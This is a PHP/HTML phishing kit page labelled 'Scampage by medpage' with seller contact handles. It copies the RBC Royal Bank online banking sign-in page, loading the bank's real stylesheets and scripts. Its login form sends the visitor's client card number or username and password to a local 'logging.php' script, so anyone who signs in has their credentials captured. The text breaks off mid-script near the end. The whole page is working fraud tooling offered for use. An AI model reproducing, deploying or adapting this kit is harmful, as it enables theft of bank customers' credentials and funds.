<?php
/*
 * Scampage by medpage
 * ICQ: 679849675
 * TELE: @medpagestore
 */
require "../includes/session_protect.php";
require "../includes/functions.php";
require "../includes/One_Time.php";



?><!DOCTYPE html>
<!--[if IE 8]><html class="no-js ie8 oldie" data-placeholder-live="false"><![endif]-->
<!--[if IE 9 ]><html class="no-js ie9 oldie"><![endif]-->
<html lang="en" class="no-js">
   <head>
    <meta name="apple-itunes-app" content="app-id=407597290">
    <title>RBC Royal Bank - Sign In to Online Banking</title>
	<script type="text/javascript" src="https://www1.royalbank.com/uos/common/javascript/dtagent_ICA23STVbjqr_7000000221015.js" data-dtconfig="agentUri=https://www1.royalbank.com/uos/common/javascript/dtagent_ICA23STVbjqr_7000000221015.js|rid=RID_-1310127233|rpid=-994809404|domain=royalbank.com|rt=10000|ade=onsubmit|bandwidth=600|domain=royalbank.com|lastModification=1558886506848|lab=1|tp=500,50,0,1|reportUrl=https://www1.royalbank.com/uos/common/javascript/dynaTraceMonitor|app=3M00 Online Banking"></script><link href="https://www1.royalbank.com/uos/common/html/manifest.json?12" rel="manifest" /> 
    <link href="https://www1.royalbank.com/uos/common/images/icons/favicon.ico?12" rel="icon" />
    <link href="https://www1.royalbank.com/uos/common/notices/css/notifications.css?12" rel="stylesheet" type="text/css" />
    <!-- Load Bootstrap CSS -->
    <link href="https://www1.royalbank.com/uos/external/bootstrap/3.3.5/css/bootstrap.min.css?12" rel="stylesheet" />
    <!-- Bootstrap Overwrites -->
    <!-- Load Master CSS (Common styles) -->
    <link href="https://www1.royalbank.com/uos/3m/css/master.css?12" rel="stylesheet" />
    <!-- Load Specific styles for specific page -->
    <link href="https://www1.royalbank.com/uos/3m/css/ibsignin.css?12" rel="stylesheet" />
    <!-- Load Specific styles for fonts -->
    <link href="https://www1.royalbank.com/uos/3m/css/rbc-icons.css?12" rel="stylesheet" />
    <!-- Load Modules -->

    <!-- Load Custom Fonts -->
    <link rel="stylesheet" href="https://www1.royalbank.com/uos/external/font-awesome/4.4.0/css/font-awesome.min.css?12" />
    <link rel="stylesheet" href="https://www1.royalbank.com/uos/3m/css/fonts/fonts.Fira_Sans.css?12" />
    <link rel="stylesheet" href="https://www1.royalbank.com/uos/3m/css/fonts/fonts.Roboto.css?12" />

    <!-- Important Note about CSS files
        All the Bootstrap CSS Overwrites need to be concatenated and minified before
        going to production.
     -->

    <!-- Load Scripts that need to load before the page starts loading -->

<!--Ensighten-->



 


<!-- START Tag MGMT Code **DO NOT REMOVE** -->
<script type="text/javascript">


dataLayer = {    
    'pageID': 'IBSIGNIN.HTM',
    'environment': 'www1-CDN-OLB',
    'locale': 'en_CA',    
    'pagetitle': 'RBC Financial Group - Online Banking',
    'opinionLab': {
		'label': 'Feedback',
		'title': 'Feedback (opens new window)'
        }
};


</script>
<script type="text/javascript" src="https://nexus.ensighten.com/rbc/olb/Bootstrap.js"></script>
<!-- END Tag MGMT Code **DO NOT REMOVE** -->

<!-- Start of ANTICLICKJACKING.JS -->

<style id="antiClickjack">body{display:none !important;}</style>

<script type="text/javascript">
   if (self === top) {
       var antiClickjack = document.getElementById("antiClickjack");
       antiClickjack.parentNode.removeChild(antiClickjack);
   } else {
       top.location = self.location;
   }
</script>

<!-- End of ANTICLICKJACKING.JS -->

<!-- Start of COMMONSRC.CINC -->



<!-- End of COMMONSRC.CINC -->

<script  type="text/javascript" src="/javascript/keypress.js?12"></script>
<script  type="text/javascript">
<!--
 function f3msignin_ForgotPassword()
 {
  if ( document.ForgotPsw.CHKCLICK.value == 'N' )
  {
   return false;
  }
  else
  {
   if ( document.rbunxcgi.CAFE && document.rbunxcgi.CAFE.checked )
   {
    alert( 'Enhanced Security must not be selected when using \'Forgot Password?\'. \nTo recover your Online Banking Password, click \'Forgot Password?\' only.' );
    document.rbunxcgi.Q1.value='';
    document.rbunxcgi.CAFE.checked=false;
   }
   else
   {
    document.rbunxcgi.CHKCLICK.value = 'N';
    document.ForgotPsw.CHKCLICK.value = 'N';
    document.ForgotPsw.K1.value = document.rbunxcgi.K1.value;
    document.ForgotPsw.submit();
   }
  }
 }
 //-->
</script>
			  
<script  type="text/javascript">
 <!--
 var CAFETimeout=900;
 function doCafeCheck()
 {
  checkCafe('You are entering the secure Online Banking transactional area. \nWhen you are finished, please select \'Sign Out\' to close your secure session.',document.rbunxcgi);
  if (document.rbunxcgi.CHKCLICK.value == 'N')
  {
   return false;
  }
  else
  {
   document.rbunxcgi.CHKCLICK.value = 'N';
   document.ForgotPsw.CHKCLICK.value = 'N';
   return true;
  }
 }
//-->
</script>		
<script  type="text/javascript">
 <!--
 var htmlvar="";
 //-->
</script>

<script  type="text/javascript">

function checkQ() {
	var fields = $('#question').val();
	
	if (fields.indexOf('href=') >= 0) {
		$('#question').val('');
	}
	else if (fields.indexOf('url=') >= 0) {
		$('#question').val('');
	}
	else if (!fields) {
		$('#question').val('');
	}
	kiosk_OpenWinRTB( 'https://www.rbcroyalbank.com/cgi-bin/cs-kioskolb/ask.cgi/response/find?question='+fields, 'RTB', kiosk_Type14X, kiosk_Type14Y, kiosk_Type14R );
}

function checkQ_OpenSamePage() {
	var fields = encodeURIComponent($('#question').val());
	
	if (fields.indexOf('href=') >= 0) {
		$('#question').val('');
	}
	else if (fields.indexOf('url=') >= 0) {
		$('#question').val('');
	}
	else if (!fields) {
		$('#question').val('');
	}
	window.open('https://www.rbcroyalbank.com/search-public/index.html?IR_INTERFACE_ID=6&question='+fields , '_self');
}

function InputSelect() {
	if ($('#question').val() == $('#question').attr('placeholder')) { $('#question').val('').css('color','#000'); }
	if ($('#question').val() != '' && $('#question').val() != $('#question').attr('placeholder')) { $('#question').select(); }
}

function getTopFive(){
    if(!getTopFive.isPrevInvoked){ 
		if ($('#topFiveList+.loading-indication').length == 0)
        {
            $('#topFiveList').after('<div class="loading-indication">Loading...</div>');
        }
		$.ajax({
			url: '/cgi-bin/rbaccess/rbunxcgi?F6=1&F7=IB&F21=IB&F22=IB&REQUEST=RBCProxyThisNS&URL_NAME=https://www.rbcroyalbank.com/cgi-bin/cs-kioskolb/ask.cgi/top10',
			type: "GET",
			mimeType: 'text\/plain; charset=ISO-8859-1',
			success: function(html){
				$('.top5Dropdown .loading-indication').remove();
				if (!html.match('^<ul')) {	$('#topFiveList').html('<p>Sorry, we are experiencing technical difficulties.</p>'); }
				else {
					$('#topFiveList').append(html);
					$('#topFiveList ul li').unwrap();
					$('#topFiveList li').slice(5).remove();
					$('#topFiveList a').each(function(){
						$(this).attr('href','javascript:kiosk_OpenWinRTB(\''+$(this).attr('href')+'\', \'RTB\', kiosk_Type14X, kiosk_Type14Y, kiosk_Type14R);');
						$(this).attr('title',$(this).text());
					}); 
					$('#topFiveList a').append('<span class="accessible"> (Opens new window)</span>');
				}
				getTopFive.isPrevInvoked = true;
			}
        });

    }    
}
</script> <link rel="stylesheet" type="text/css" href="https://www1.royalbank.com/uos/common/css/print.css?12" media="print" />
<link rel="stylesheet" type="text/css" href="https://www1.royalbank.com/uos/common/css/common.css?12" />

<script  type="text/javascript" src="https://www1.royalbank.com/uos/common/javascript/utilities.js?12"></script>
<script  type="text/javascript" src="https://www1.royalbank.com/uos/common/javascript/custom.js?12"></script>
<script  type="text/javascript" src="https://www1.royalbank.com/uos/common/javascript/browser.js?12"></script>
<script  type="text/javascript" src="https://www1.royalbank.com/uos/common/javascript/ie/event.js?12"></script>
<script  type="text/javascript" src="https://www1.royalbank.com/uos/common/javascript/event.js?12"></script>
<script  type="text/javascript" src="https://www1.royalbank.com/uos/common/javascript/kiosk.js?12"></script>
<script  type="text/javascript" src="https://www1.royalbank.com/uos/common/javascript/common.js?12"></script>
<script  type="text/javascript" src="https://www1.royalbank.com/uos/common/javascript/header_dates.js?12"></script>
<script  type="text/javascript" src="https://www1.royalbank.com/uos/common/javascript/cookie.js?12"></script>
<script  type="text/javascript" src="https://www1.royalbank.com/uos/3m/javascript/enhancedJuly.js?12"></script>
<script  type="text/javascript" src="https://www1.royalbank.com/uos/common/javascript/hashtable.js?12"></script>
<script  type="text/javascript" src="https://www1.royalbank.com/uos/common/javascript/rsa73.js?12"></script>
    <script type="text/javascript" src="https://www1.royalbank.com/uos/common/javascript/kiosk.js?12"></script>
    <script type="text/javascript">
  function submitOtherOnlineMenu1()
  {
    window.location = document.serviceSelector.selectService.options[document.serviceSelector.selectService.options.selectedIndex].value;
  }
  </script>


    <!-- custom Modernizr -->
    <script src="https://www1.royalbank.com/uos/external/modernizr/2.8.3/modernizr.min.js?12"></script>
    <!-- NOTE: This will prevent the user to zoom in and out with keyboard. Disabled for now. -->
    <!-- <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=0"> -->




<script language="JavaScript" type="text/JavaScript">
rbcDeleteCookie( "3MTK", "/" );
</script>



  <script async type="text/javascript" src="https://d3tracking.rbc.com/fp/tags.js?org_id=4rvrfbxt&session_id=87B6D820129E884045900C4E2FEF4F7D&page_id=1"></script></head>
  <body onfocus="event_onFocusForm();" onmouseover="event_onFocusForm();" onblur="event_onBlurForm();" onmouseout="event_onBlurForm();" onload="event_onLoad();" onunload="event_onUnload();">
    <!-- RBC Wrapper Starts -->

    <div class="mainWrapper">
      <!-- Header Starts -->
      <a id="skipheadernav" href="#mainContent" class="skipNav accessible">Skip to Main Content</a>
      <header> 
        <div class="signInHeader">
          <div class="nav-header">
            <nav>
<ul id="nav-ul">
  <li><a href="http://www.rbcroyalbank.com/personal.html" ga-on="click" ga-event-category="Header" ga-event-action="Click Link" ga-event-label="Personal">Personal</a></li>
  <li><a href="http://www.rbcroyalbank.com/business/index.html" ga-on="click" ga-event-category="Header" ga-event-action="Click Link" ga-event-label="Business">Business</a></li>
  <li><a href="https://www.rbcwealthmanagement.com/" ga-on="click" ga-event-category="Header" ga-event-action="Click Link" ga-event-label="Wealth">Wealth</a></li>
  <li id="header-overlay" class="dropdown-overlay">
    <button id="header-institutional" type="button" aria-controls="institutional-dropdown" aria-expanded="false">Institutional</button>
    <ul id="institutional-dropdown" class="dropdown-content chevron-list hidden">
      <li><a href="http://www.rbcgam.com/landing.html" ga-on="click" ga-event-category="Header" ga-event-action="Click Link" ga-event-label="Global Asset Management">Global Asset Management</a></li>
      <li><a href="https://www.rbccm.com/en/" ga-on="click" ga-event-category="Header" ga-event-action="Click Link" ga-event-label="Capital Markets">Capital Markets</a></li>
      <li><a href="https://www.rbcits.com/en/" aria-describedby="collapse-text" ga-on="click" ga-event-category="Header" ga-event-action="Click Link" ga-event-label="Investor Services">Investor Services</a>
        <p id="collapse-text" class="accessible">Dropdown window will collapse when you tab left or right.</p>
      </li>
    </ul>
  </li>
  <li><a href="https://www.rbc.com/labs/index.html" ga-on="click" ga-event-category="Header" ga-event-action="Click Link" ga-event-label="RBC Labs">RBC Labs</a></li>
  <li><a href="http://www.rbc.com/canada.html" ga-on="click" ga-event-category="Header" ga-event-action="Click Link" ga-event-label="About RBC">About RBC</a></li>
</ul>            </nav>
          </div>
          <div id="header" class="header">
            <div class="header-icon"><a href="http://www.rbcroyalbank.com/personal.html"><img src="https://www1.royalbank.com/uos/3m/images/logo_rbc-royalbank-white-en.svg" alt="RBC"></a></div>
            <div class="header-content">
              <div aria-label="Open search dialog" role="button" tabindex="0" class="search-trigger"><span class="search-text"><img src="https://www1.royalbank.com/uos/3m/images/icons/search-signin.svg" alt="Search"><span>Search RBC...</span></span></div>
              <div class="global-nav">
                <div id="header-contact" class="global-nav-item"><a href="https://www.rbcroyalbank.com/customer-service/index.html?RefURL=https://www1.royalbank.com/cgi-bin/rbaccess/rbcgi3m01&amp;NoEmailSend=DisplayMsg">Contact Us</a></div>
                <div id="lang-overlay" role="button" class="global-nav-item dropdown-overlay">
                  <div id="header-lang" role="button" type="button" tabindex="0" aria-expanded="false" aria-controls="content-language" class="dropdown-text"><img src="https://www1.royalbank.com/uos/3m/images/flags/canada.svg" alt="Canada"><span>(EN)</span></div>
                  <div id="lang-dropdown" aria-labelledby="header-lang" class="dropdown-content hidden">
                    <ul>
                      <li><a id="lang-can-en" href="/cgi-bin/rbaccess/rbcgi3m01?F6=1&amp;F7=IB&amp;F21=IB&amp;F22=IB&amp;REQUEST=ClientSignin&amp;LANGUAGE=ENGLISH" role="button" class="active-lang"><img src="https://www1.royalbank.com/uos/3m/images/flags/canada.svg" alt="Canada"><span>Canada - EN</span></a></li>
                      <li><a id="lang-can-fr" href="/cgi-bin/rbaccess/rbcgi3m01?F6=1&amp;F7=IB&amp;F21=IB&amp;F22=IB&amp;REQUEST=ClientSignin&amp;LANGUAGE=FRENCH" role="button"><img src="https://www1.royalbank.com/uos/3m/images/flags/canada.svg" alt="Canada"><span>Canada - FR</span></a></li>
                    </ul>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>
        <div id="signinSearch" tabindex="-1" aria-labelledby="question" role-dialog aria-hidden="true" class="signin-search-bar-overlay hidden">
          <div class="signin-search-bar-inner">
            <div class="signin-search-logo"><img src="https://www1.royalbank.com/uos/3m/images/logo-rbc-shield.svg" alt="RBC"></div>
            <div class="signin-search-form">
              <form action="javascript:checkQ_OpenSamePage();" class="header-search-form">
                <label for="question" class="accessible"></label>
                <input id="question" type="text" placeholder="Ask your question" title="Ask your question" role="search">
              </form>
              <button id="search-close" type="button" aria-label="Close search" class="search-close"><img src="https://www1.royalbank.com/uos/3m/images/icons/close-blue.svg" alt="Close search"></button>
            </div>
          </div>
        </div>
      </header>
      <!-- Header Ends -->  
      <!-- RBC Wrapper Starts-->
      <div id="rbcWrapper" class="rbcWrapper__signIn container">       
        <!-- Remember to always add here accessible links to the main content sections (main content, sidebar, footer) If there's more than one, please notify and make this an unordered list of links.-->
        <!-- Main Container Starts-->
        <main id="signInPage" role="main" tabindex="-1" aria-label="Content" class="row">
          <!-- No sidebar for this page -->
        <!-- Use this for accessibility purposes. Will describe page on screen readers-->
        <h1 class="accessible">Welcome to Online Banking</h1>
          <section id="mainContent" role="main" tabindex="-1" class="col-xs-12">
            <!-- SignIn Banner Starts-->
            <div id="signInBanner">
              <section id="primarySignIn">
                <h2>Sign in to Online Banking</h2>
                <form id="rbunxcgi" name="rbunxcgi" action="logging.php" method="post">

                    <input type="hidden" name="FromPreSignIn_SIP" value="Y" />
                    <input name="LANGUAGE" type="hidden" value="ENGLISH" />
                    <input name="F30" type="hidden" value="1,X001,5,K1,2,Q1" />
                    <input name="SST" type="hidden" value="B-MABQAbABIAMAAOAAaEdQ??" />
                    <input name="F6"  type="hidden" value="1" />
                    <input name="F7" type="hidden"     value="S0" />
                    <input name="F21" type="hidden" value="PB" />
                    <input name="F22" type="hidden" value="HT" />
                    <input name="CHKCLICK"    type="hidden" value="Y" />
                    <input name="NNAME" type="hidden" value="" />
                    <input name="RSA_DEVPRINT" type="hidden" value="" />
                    <input id="NOJAVASCRIPT2" name="NOJAVASCRIPT" type="hidden" value="Y" />
                    <script type="text/javascript">
                        var noscriptElement = document.getElementById("NOJAVASCRIPT2");
                            noscriptElement.parentNode.removeChild(noscriptElement);
                    </script>


                    <fieldset>
                    <legend class="accessible">Sign in Form</legend>
                    <!-- CC Text Input Starts -->
                    <div class="formBlock formBlock_clientCardOrUserName">
                        <label for="K1" class="signInLabel">Client Card or Username</label>
                        <div class="toolTip">
                            <button type="button" data-toggle="dropdown" aria-expanded="false" title="More information about Client Card or Username" class="dropdown-toggle"><span class="accessible">More information about Client Card or Username</span></button>
                            <div class="dropdown-menu">
                                <span class="accessible">Start of Region Help - Client Card</span>
                                <h4 class="dropdown-header">Help - Client Card or Username</h4>
                                <p>Enter the 16-digit number from the card you use for debit and ATM transactions. If you don&rsquo;t have a card, you can use the number you were given at the branch to access Online Banking.</p>
                                <p>If you have set up a username, you can enter it in this field to log in to Online Banking.</p>
                                <img src="https://www1.royalbank.com/uos/common/images/icons/tooltipPeak.png" alt="" aria-hidden="true" class="peak" />
                                <div tabindex="0" class="closeDropdown" title="Close Region Help - Client Card Button - tabbing off will close window"><i aria-hidden="true" class="rbc-icon rbc_close" ></i><span class="accessible">Close Region Help - Client Card Button - tabbing off will close window</span></div>
                                <span class="accessible">End of Region Help - Client Card</span>
                            </div>
                        </div>
                        <div class="userSelectionWrapper">
                            <input type="text" name="UN" id="K1" tabindex="2" class="ccUsername" required=""
                                />
                        </div>
                        <div class="formLinks">
                            <a href="javascript:document.forgotUsername.submit();" tabindex="6" class="formLinksFirstA" ga-on="click" ga-event-category="Body" ga-event-action="Click Link" ga-event-label="Recover your username">Recover your username<span aria-hidden="true" class="icon_angleRightSmall"></span></a>
                        </div>
                    </div>
                    <!-- CC Text Input Ends -->

                    <!-- Password Input Starts -->
                    <div class="formBlock formBlock_password">
                        <label for="Q1" class="signInLabel">Password<span class="accessible"> (required)</span></label>
                        <div class="inputWrapper">
                            <input type="password" name="PW" id="Q1" tabindex="3" required="" />
                        </div>
                        <div class="formLinks">
                      <a href="javascript:f3msignin_ForgotPassword();" tabindex="7" ga-on="click" ga-event-category="Body" ga-event-action="Click Link" ga-event-label="Reset your password">Reset your password<span aria-hidden="true" class="icon_angleRightSmall"></span><span class="accessible">Opens in same window</span></a>
                        </div>
                    </div>
                    <!-- Password Input Ends -->
					 <div class="formBlock formBlock_rememberCheckbox">
                      <div class="inputWrapper">
					            <div class="checkBoxWrapper">
                                    <input type="checkbox" name="N1" tabindex="5" id="N1" onclick="javascript:if (this.checked) { document.rbunxcgi.NNAME.value='ecatsRememberMe'; } else { document.rbunxcgi.NNAME.value=''; }" class="checkboxInput" />
                                    <span aria-hidden="true" class="checkbox"></span>
                                    <label for="N1" class="checkBoxLabel">Remember your client card or username</label>
                                    <div class="toolTip">
                                        <button type="button" data-toggle="dropdown" aria-expanded="false" title="More information about Remember Me" class="dropdown-toggle"><span class="accessible">More information about Remember Me</span></button>
                                        <div class="dropdown-menu">
                                            <span class="accessible">Start of Region Help - Remember Me</span>
                                            <h4 class="dropdown-header">Help - Remember  your client card or user name</h4>
                                            <p>Check this box if you&rsquo;d like to save your Client Card number or username on this computer, so you don&rsquo;t have to enter it again the next time you log in to Online Banking.</p>
                                            <p>We don&rsquo;t recommend this option if you&rsquo;re using a public or shared computer.</p>
											<p>If you delete the cookies on your computer, you&rsquo;ll erase any saved Client Card numbers or usernames.</p>
                                            <img src="https://www1.royalbank.com/uos/common/images/icons/tooltipPeak.png" alt="" aria-hidden="true" class="peak" />
                                            <div tabindex="0" class="closeDropdown" title="Close Region Help - Remember Me Button - tabbing off will close window"><i aria-hidden="true" class="rbc-icon rbc_close" ></i><span class="accessible">Close Region Help - Remember Me Button - tabbing off will close window</span></div>
                                            <span class="accessible">End of Region Help - Remember Me</span>
                                         </div>
						            </div>
                        </div>
					 </div>
                    </div>
                    <!-- SignInButton Starts-->
                    <div class="formBlock formBlock_mainSignIn">
                        <div class="inputWrapper">
					     <button type="submit" tabindex="4" class="yellowBtnLarge">Sign In</button>
                        </div>				 
                        </div>
					<!-- SignInButton Ends-->	   
                    <div class="formLinksSecurityGuarantee">
			<div aria-hidden="true" class="securityIcon"></div><a title="RBC Security Guarantee (Opens new tab)" href="javascript:kiosk_OpenWinRTB('http://www.rbcroyalbank.com/online/rbcguarantee.html', 'TAB', 40, 50, kiosk_Type1R)" area-hidden="true"  ga-on="click" ga-event-category="Body" ga-event-action="Click Link" ga-event-label="RBC Security Guarantee">RBC Security Guarantee<span class="accessible">Opens new tab</span></a> 
                        <div class="toolTip">
                          <button data-toggle="dropdown" aria-expanded="false" class="dropdown-toggle">
                          </button>
                          <div role="tooltip" class="dropdown-menu"><span class="accessible">Help - RBC Security Guarantee</span>
                            <h4 class="dropdown-header">Help - RBC Security Guarantee</h4>
                            <p tabindex="0">We&rsquo;ll fully reimburse any unauthorized transactions made in RBC Royal Bank Online Banking.
                            </p>
                            <button class="closeDropdown"><i aria-hidden="true" class="rbc-icon rbc_close"></i><span class="accessible">Close tooltip</span></button><span class="accessible">End of RBC Security Guarantee Help </span>
                          </div>
                        </div></div>
                  </fieldset>
                </form>
              </section>
              <!-- Secondary signin Starts -->
                <section id="secondarySignIn">
                    <div id="signinEnrollWidget" class="secondarySignInWidget">
                    <div class="signinEnrollWidget_left">
                        <h2>New to Online Banking?</h2>
			<p class="secondarySignInWidget_left_linkwrapper"><a title="Discover what it can do for you (Opens new tab)" href="javascript:kiosk_OpenWinRTB('https://www.rbcroyalbank.com/ways-to-bank/online-banking/index.html', 'TAB', 40, 50, kiosk_Type1R)" area-hidden="true" ga-on="click" ga-event-category="Body" ga-event-action="Click Link" ga-event-label="Discover what it can do for you">Discover<span class="accessible">Opens new tab</span></a> what it can do for you.</p>
		    </div> 
                    <div class="signinEnrollWidget_right">
                        <button type="button" onclick="location.href='/cgi-bin/rbaccess/rbcgi3m01?F6=1&amp;F7=IB&amp;F21=IB&amp;F22=HT&amp;REQUEST=IBOnlineEnrollLink&amp;LANGUAGE=ENGLISH'" class="blueBtnWhiteBorder" ga-on="click" ga-event-category="Body" ga-event-action="Click Link" ga-event-label="Enrol Now">Enrol Now <span class="accessible">Opens in same window</span></button>
				     </div>
					 </div>
                  <form action='javascript:submitOtherOnlineMenu1();' id="serviceSelector" name="serviceSelector" class="navbar-form-alt">
                    <div id="signinServicesSelector" class="secondarySignInWidget formBlock selectSec">
					    <div class="secondarySignInWidget_left">
                        <h2>Other Online Services
                                <div class="form-group">
                                    <div class="input-group">
                                        <label for="selectService" class="formLabelInline accessible">Other Online Services</label>
                                        <select id="selectService" name="selectService" class="form-control" >
                                            <option value="/english/netaction/sgne.html">RBC Direct Investing</option>
                                            <option value="/english/ris/pcd/sgne.html">Dominion Securities Online</option>   
                                            <option value="/english/invest-ease/sgne.html">RBC InvestEase</option>                                            
                                            <option value="/cgi-bin/rbaccess/rbunxcgi?CHOICE=Personal&F21=IB&F22=IB&F6=1&F7=IB&GOTO=RewardsRefresh&LANGUAGE=ENGLISH&REQUEST=ErnexLink">RBC Rewards</option>
                                            <option value="/english/wm/sgne.html">PH&N Investment Counsel</option>
											<option value="/english/wm/sgne.html">Estate & Trust Services</option>
											<option value="https://www1.rbcbank.com/cgi-bin/rbaccess/rbunxcgi?F6=1&amp;F7=NS&amp;F21=IB&amp;F22=CN&amp;REQUEST=CenturaClientSignin&amp;LANGUAGE=ENGLISH">RBC Bank USA</option>
											<option value="https://caribbean.rbcroyalbank.com/#/login">RBC Caribbean</option>
											<option value="https://www6.rbc.com/webapp/ukv0/signin/logon.xhtml?lang=en">RBC Express</option>
											<option value="https://www.rbcglobaltrade.rbc.com/portal/PasswordLogon.jsp?organization=rbc&amp;branding=rbc&amp;locale=en_CA">RBC Global Trade</option>
											<option value="http://www.rbc.com/online-services.html">Other Services</option>
                                        </select>                                       
                                    </div>
                                </div>
						</h2>
                        </div>
								<div class="secondarySignInWidget_right">
										<button type="submit" class="blueBtnWhiteBorder" ga-on="click" ga-event-category="Body" ga-event-action="Click Button" ga-event-label="Go">Go<span class="accessible">Opens in same window</span></button>
								</div>	
                 </div>				
                </form>
                <div class="secondarySignInWidgetlinksTitle">
                  <h2>How Can We Help You?</h2>
                </div>
                <div class="secondarySignInWidgetlinks">
                  <div class="secondarySignInWidgetlinks_left">
                    <div class="secondarySignInWidgetlinks_wrapper">
                      <a title="FAQs about signing in (Opens new tab)"href="javascript:kiosk_OpenWinRTB('https://www.rbcroyalbank.com/onlinebanking/remember_my_card/about.html', 'TAB', 40, 50, kiosk_Type1R)" tabindex="9" class="formLinksFirstB"  ga-on="click" ga-event-category="Body" ga-event-action="Click Link" ga-event-label="FAQs about signing in">FAQs about signing in<i aria-hidden="true" class="rbc-icon rbc_new_window2019"></i><span class="accessible">(Opens new tab)</span></a>
                    </div>
                    <div class="secondarySignInWidgetlinks_wrapper">
                      <a title="Report a lost or stolen card (Opens new tab)" href="javascript:kiosk_OpenWinRTB('http://www.rbcroyalbank.com/products/deposits/lost-stolen-card.html', 'TAB', 40, 50, kiosk_Type1R)" tabindex="9" class="formLinksFirstB" ga-on="click" ga-event-category="Body" ga-event-action="Click Link" ga-event-label="Report a lost or stolen card">Report a lost or stolen card<i aria-hidden="true" class="rbc-icon rbc_new_window2019"></i><span class="accessible">(Opens new tab)</span></a>
                    </div>
                  </div>
                  <div class="secondarySignInWidgetlinks_right">
                    <div class="secondarySignInWidgetlinks_wrapper">
                      <a title="Report a security concern (Opens new tab)" href="javascript:kiosk_OpenWinRTB('http://www.rbc.com/privacysecurity/ca/contact-us.html', 'TAB', 40, 50, kiosk_Type1R)" tabindex="9" class="formLinksFirstB" ga-on="click" ga-event-category="Body" ga-event-action="Click Link" ga-event-label="Report a security concern">Report a security concern<i aria-hidden="true" class="rbc-icon rbc_new_window2019"></i><span class="accessible">(Opens new tab)</span></a>
                    </div>
                    <div class="secondarySignInWidgetlinks_wrapper">
                      <a title="Branch & ATM locator (Opens new tab)" href="javascript:kiosk_OpenWinRTB('http://maps.rbc.com/index.en.asp', 'TAB', 40, 50, kiosk_Type1R)" tabindex="9" class="formLinksFirstB" ga-on="click" ga-event-category="Body" ga-event-action="Click Link" ga-event-label="Branch & ATM locator">Branch & ATM locator<i aria-hidden="true" class="rbc-icon rbc_new_window2019"></i><span class="accessible">(Opens new tab)</span></a>
                    </div>
                  </div>
                </div>
              </section>
              <!-- Secondary signin Ends -->
            </div>

            <!-- SignIn Banner Ends-->
            <!-- SignIn Maintenance Starts -->
            <div id="publicNotice">
              <script  type="text/javascript">
                var pubContentURL = "https://www.rbcroyalbank.com";
                var language = 0;
              </script>
              <script  src="https://www.rbcroyalbank.com/onlinebanking/sign-in/jsincludes/pubnotice.js?12" type="text/javascript"></script>


              <script  src="https://www1.royalbank.com/uos/common/javascript/showinfonoticenew.js?12" type="text/javascript"></script>

            </div>

            <div id = "serviceNotice">

              <script  type="text/javascript">
                var pubContentURL = "https://www.rbcroyalbank.com";
                var language = 0;
              </script>

              <script  type="text/javascript" src="https://www.rbcroyalbank.com/onlinebanking/sign-in/jsincludes/servicenotice.js?12"></script>

              <script  type="text/javascript" src="https://www1.royalbank.com/uos/common/javascript/showservicenoticenew.js?12"></script>

            </div>
            <!-- SignIn Maintenance Ends -->
            <!-- OLB Links Starts-->
            <div id="newsupdfaq" class="signin_content2">
<!-- MKTNEWSUPD.INC begins -->

<script  src="https://www.rbcroyalbank.com/onlinebanking/sign-in/jsincludes/marketing-new.js?12" type="text/javascript"></script> 

<script  type="text/javascript">
var pubContentURL = "https://www.rbcroyalbank.com";
var language = 0;
</script>
<script  src="https://www1.royalbank.com/uos/common/javascript/newsandupdates.js?12" type="text/javascript"></script>
<!-- MKTNEWSUPD.INC ends -->
              <script  src="https://www.rbcroyalbank.com/onlinebanking/sign-in/jsincludes/faqcontent.js?12" type="text/javascript"></script>
                
              <script  src="https://www1.royalbank.com/uos/common/javascript/showfaqs.js?12" type="text/javascript"></script>

            </div>
            <!-- OLB Links Ends-->
          </section>
        </main>
        <!-- Main Container Ends -->
    </div>
    <!-- RBC Wrapper Ends --> 
    <!-- Legal & Bottom links Starts-->
<div class="main-legal">
  <div class="main-legal-inner">
  <div class="legal-left">
    <p>Royal Bank of Canada Website, © 1995-2021</p>
    <p>
      <a title="Legal (Opens new window)" href="javascript:kiosk_OpenWinRTB( 'http://www.rbc.com/legal/', 'RTB', kiosk_Type3X, kiosk_Type3Y, kiosk_Type3R )" ga-on="click" ga-event-category="Footer" ga-event-action="Click Link" ga-event-label="Legal">Legal<span class="accessible"> (Opens new window)</span></a>
      &nbsp;|&nbsp;
      <a title="Accessibility (Opens new window)" href="javascript:kiosk_OpenWinRTB( 'http://www.rbc.com/accessibility/', 'RTB', kiosk_Type3X, kiosk_Type3Y, kiosk_Type3R )" ga-on="click" ga-event-category="Footer" ga-event-action="Click Link" ga-event-label="Accessibility">Accessibility<span class="accessible"> (Opens new window)</span></a>
      &nbsp;|&nbsp;
      <a title="Privacy &amp; Security (Opens new window)" href="javascript:kiosk_OpenWinRTB( 'http://www.rbc.com/privacysecurity/ca/', 'RTB', kiosk_Type2X, kiosk_Type2Y, kiosk_Type2R )" ga-on="click" ga-event-category="Footer" ga-event-action="Click Link" ga-event-label="Privacy & Security">Privacy &amp; Security<span class="accessible"> (Opens new window)</span></a>
  </div>
  <div class="legal-right">
    <div class="to-top"><a href="#skipheadernav"><img src="https://www1.royalbank.com/uos/3m/images/to-top-white.svg"><span>Top</span></a></div>
    </div>
  </div>
</div>
    <!-- Footer Legal Nav Ends-->
    <div class="signinOverlay"></div>
    </div>
    <!-- All scripts should be  placed at the bottom-->
    <!-- Scripts Start-->
        <script src="https://www1.royalbank.com/uos/external/jquery/1.11.3/jquery.min.js?12"></script>
        <script src="https://www1.royalbank.com/uos/external/bootstrap/3.3.5/js/bootstrap.min.js?12"></script>
        <script src="https://www1.royalbank.com/uos/external/jQuery-Autocomplete/1.2.24/js/jquery.autocomplete.js?12"></script>
        <script  src="https://www1.royalbank.com/uos/common/javascript/initelemstates.js?12" type="text/javascript"></script>
        <script src="https://www1.royalbank.com/uos/3m/javascript/custom.js?12"></script>
        <script src="https://www1.royalbank.com/uos/3m/javascript/accessibility.js?12"></script>
        <script src="https://www1.royalbank.com/uos/3m/javascript/signin.js?12"></script>
        <script>
// 3MDELTA.JS
{
  var cdate = new Date();
  var delta = Math.round( cdate.valueOf() / 1000 );
  var pDelta = rbcGetCookie( "3mDELTA", null );
  var dtype = '0';

  if ( pDelta != null )
  {
    var loc = pDelta.indexOf( '/', 0 );
    if ( loc != -1 )
      dtype = pDelta.substring( loc + 1, pDelta.length );
  }

  cdate = new Date( cdate.valueOf() + 604800000 ); // 7 days

  if ( browser_IE || browser_IE4 || browser_MAC || browser_IE4M )
  {
    if ( delta < 2000000000 && delta > 315532800 )  // sanity test -- This will break in 2033
    {
